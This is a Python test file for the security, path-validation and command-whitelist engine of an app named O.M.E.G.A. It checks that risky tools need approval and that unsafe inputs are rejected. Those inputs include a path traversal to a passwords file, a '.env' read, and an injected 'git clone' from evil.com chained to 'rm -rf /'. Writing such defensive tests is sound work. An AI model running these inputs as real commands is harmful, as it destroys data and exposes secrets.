"""
Automated Tests for O.M.E.G.A Security, Validation, and Permission Engine
"""

import pytest
from app.security.permissions import permission_engine, RiskCategory
from app.security.validation import validate_workspace_path, validate_command_safety


def test_tool_risk_categories():
    assert permission_engine.get_tool_category("list_directory") == RiskCategory.READ_ONLY
    assert permission_engine.get_tool_category("read_file") == RiskCategory.READ_ONLY
    assert permission_engine.get_tool_category("delete_file") == RiskCategory.DESTRUCTIVE
    assert permission_engine.get_tool_category("execute_terminal_command") == RiskCategory.SENSITIVE
    assert permission_engine.requires_approval("delete_file") is True
    assert permission_engine.requires_approval("list_directory") is False


def test_path_traversal_prevention():
    # Outside allowed workspace or escaping
    valid, err, path = validate_workspace_path("../../some_secret_root_dir_12345/passwords.txt")
    assert not valid
    assert "outside allowed workspaces" in err or "denied" in err


def test_forbidden_sensitive_files():
    valid, err, path = validate_workspace_path(".env")
    assert not valid
    assert "strictly denied" in err


def test_command_safety_whitelist():
    # Safe commands
    safe, _ = validate_command_safety("git", ["status"])
    assert safe
    safe, _ = validate_command_safety("npm", ["test"])
    assert safe
    safe, _ = validate_command_safety("pytest", ["-v"])
    assert safe

    # Forbidden binary
    safe, err = validate_command_safety("powershell", ["-Command", "Get-Process"])
    assert not safe
    assert "not in the approved developer whitelist" in err

    # Destructive pattern
    safe, err = validate_command_safety("git", ["clone", "https://evil.com/repo", "&&", "rm", "-rf", "/"])
    assert not safe
    assert "forbidden" in err
